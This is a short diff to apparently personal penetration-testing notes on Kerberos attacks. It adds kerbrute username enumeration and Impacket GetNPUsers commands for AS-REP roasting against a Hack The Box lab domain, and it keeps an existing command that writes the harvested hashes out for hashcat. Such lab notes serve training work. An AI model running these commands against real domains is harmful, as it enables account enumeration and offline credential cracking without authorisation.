@@ -5,6 +5,16 @@
 - [GitHub Rubeus](https://github.com/GhostPack/Rubeus)
 ### ASREP Roasting Attack
 
+### Check for valid usernames
+
+```
+/opt/kerbrute userenum --dc $ip -d intelligence.htb users
+
+then do this
+
+GetNPUsers.py -no-pass -dc-ip $ip intelligence.htb/Jose.Williams
+```
+
 ```
 impacket-GetNPUsers htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt
 
